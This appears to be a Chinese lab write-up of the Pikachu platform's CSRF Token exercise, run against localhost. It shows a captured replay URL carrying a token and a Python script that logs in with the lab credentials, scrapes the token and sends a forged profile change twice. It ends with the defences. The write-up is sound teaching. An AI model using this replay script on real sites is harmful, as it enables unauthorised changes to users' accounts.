【Pikachu】Web-CSRF Token Writeup

操作者：何芊宏 | 操作日期：2026.9.27 | 分类：Pikachu | 标签：Pikachu, Web, CSRF, Token, 重放攻击, F12, VS Code

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - CSRF (Cross-Site Request Forgery)
  • 题目名称：CSRF Token
  • 目标：理解 CSRF Token 防御机制的工作原理，分析在 Token 未严格绑定 Session 或未实现一次性销毁的情况下，利用重放攻击绕过防御的可行性。

2. 解题思路与知识点

漏洞原理：

为了防止 CSRF 攻击，开发者通常会在敏感操作的请求中加入一个随机生成的 Token（令牌）。服务器在接收到请求时，会校验 Token 是否合法。然而，如果后端代码在实现时存在逻辑缺陷，例如 Token 没有与当前用户的 Session 严格绑定，或者验证成功后未及时销毁 Token，攻击者一旦捕获到一个合法用户的带 Token 请求，就可以反复使用该请求（重放攻击）来实施 CSRF，导致防御机制失效。

工具选型与心路历程：
  • Python 自动化脚本尝试：尝试使用 requests.Session() 模拟登录并利用正则表达式从页面源码中提取 Token，再发起自动化攻击。但在实际运行中，由于 Pikachu 老靶场代码（PHP 5 时代产物）在高版本 PHP 8 环境下的 Session 兼容性问题，Python 模拟登录频频被服务器拒绝，导致脚本无法获取有效 Token。
  • 浏览器 F12 网络面板抓包：果断放弃 Python 登录尝试，回归浏览器。利用 F12 开发者工具的 Network（网络）面板，开启“保留日志”功能，成功记录了表单提交瞬间的完整请求 URL，精准提取出包含 Token 的攻击载荷。
  • 手动重放攻击验证：通过在新标签页中复用抓取到的带 Token 的完整 URL，向服务器发起多次请求（重放攻击），以验证 Token 防御机制是否有效。

3. 操作步骤

第一步：环境搭建与源码兼容性修复（VS Code 操作）

踩坑记录：访问 CSRF Token 关卡页面时，页面再次抛出 Warning: mysql_fetch_array() expects parameter 2 to be int... 以及 MYSQL_ASSOC 常量未定义的报错，导致页面白屏。

操作：使用 VS Code 打开报错的文件路径 D:\phpstudy_pro\WWW\pikachu\vul\csrf\csrftoken\token_get_edit.php。

查找与替换：按 Ctrl + H，将 MYSQL_ASSOC 替换为 MYSQLI_ASSOC，按 Ctrl + S 保存。刷新页面后报错消除，数据正常显示。

第二步：认识 Token 机制与隐藏字段分析

操作：点击“修改个人信息”，按 F12 打开开发者工具，选择 元素 (Elements) 标签页，定位到表单源码。

隐藏字段：发现表单中包含一个隐藏的输入框：

<input type="hidden" name="token" value="486516ab8fcee9cc3f365737916">

分析：该 Token 是服务器随机生成的。因为该表单的提交方式为 GET 请求（method="get"），所以提交时该 Token 会作为参数直接暴露在 URL 中。

第三步：抓取携带 Token 的完整攻击载荷（F12 抓包）

操作：保持登录状态，回到表单页面填写数据（如性别：girl，手机：110，住址：china），准备提交。

F12 配置：打开 F12 的 网络 (Network) 面板，勾选 保留日志 (Preserve log)，并点击禁止圈图标清空当前记录。

提交与抓取：点击 submit 提交。在 Network 列表中找到名为 token_get_edit.php 的请求，点击它，在右侧 Headers (标头) -> General (常规) 中，找到 Request URL (请求网址)。右键选择“复制值”。

提取到的完整 URL：

http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=girl&phonenum=110&email=hacker@hacked.com&address=china&submit=submit&token=486516ab8fcee9cc3f365737916

保留日志的作用：提交表单后，页面会发生跳转（重定向）。如果不开启“保留日志”，浏览器会清空之前的请求记录，导致包含 Token 的提交请求瞬间消失。开启后，所有请求都会被保留，方便提取带有敏感参数的请求 URL。

第四步：重放攻击验证

操作：在浏览器新建两个标签页（保持登录状态，不要退出登录）。

重放攻击：将刚才复制的完整 URL（包含 Token）分别粘贴到新建的两个标签页中并回车。

结果验证：如果页面没有提示“Token 错误”，而是再次显示修改成功（或引发报错白屏，但数据已写入），则证明 Token 机制存在重放漏洞。

数据库验证：运行 Python 查库脚本 check_db.py，确认数据库中的信息被成功修改为 girl/110/china。

第五步：Python 自动化尝试（失败记录与解析）

操作：编写 Python 脚本，尝试使用 requests.Session() 自动完成登录、Token 提取和攻击。

Python 核心代码：

import requests
import re

s = requests.Session()
login_url = "http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_login.php"
login_data = {"username": "vince", "password": "123456", "submit": "Login"}
r_login = s.post(login_url, data=login_data, timeout=5)

if "退出登录" not in r_login.text:
    print("[-] 登录失败，请检查账号密码或URL。")
    exit()

edit_url = "http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_edit.php"
r_edit = s.get(edit_url, timeout=5)
match = re.search(r'name="token" value="(.*?)"', r_edit.text)
token = match.group(1)

attack_url = "http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_edit.php"
payload = {"sex": "boy", "phonenum": "999", "email": "attacked@hacker.com", "address": "attacked_address", "submit": "submit", "token": token}
r_attack = s.get(attack_url, params=payload, timeout=5)

# 重放攻击测试
r_replay = s.get(attack_url, params=payload, timeout=5)

失败原因分析：脚本运行后提示“登录失败”。原因是 Pikachu 老旧靶场在 PHP 8 环境下，Session 机制对 Python requests 库保持的会话识别异常，导致模拟登录失败。这不属于脚本逻辑错误，而是环境兼容性问题。

4. 踩坑记录与复盘

  • 坑1：PHP 8 环境下的数据库报错。老靶场代码使用了已被废弃的 MYSQL_ASSOC 常量，导致页面读取数据时崩溃。解决方案是全局替换为 MYSQLI_ASSOC。
  • 坑2：地址栏跳转导致丢包。表单提交后页面立即发生重定向，导致地址栏中带有敏感参数的 URL 瞬间消失。开启 F12 的“保留日志”（Preserve log）功能是解决此问题的关键。
  • 坑3：Python 模拟登录兼容性差。由于 PHP 8 对老靶场 Session 处理机制的改变，Python 脚本无法成功通过 POST 请求模拟登录。在实战中，遇到此类环境障碍，应灵活切换回浏览器手动抓包或使用 Burp Suite 等工具进行拦截。

5. 知识总结

  • CSRF Token 防御机制：服务端应生成随机且不可预测的 Token，并将其与用户的 Session 绑定。Token 必须在每次验证后销毁（一次性使用），且不应暴露在 URL 中（应置于 POST 请求体中），以防止重放攻击。
  • 重放攻击的原理：攻击者截获并重复发送一个有效的合法请求（包含正确的 Cookie 和 Token），如果服务器没有检测到重复性或 Token 未失效，攻击即可成功。
  • F12 网络面板的战术价值：在网络攻防实战中，“保留日志”是抓取瞬时请求、分析请求结构、提取敏感参数（如 Token、Session ID）的核心技巧。
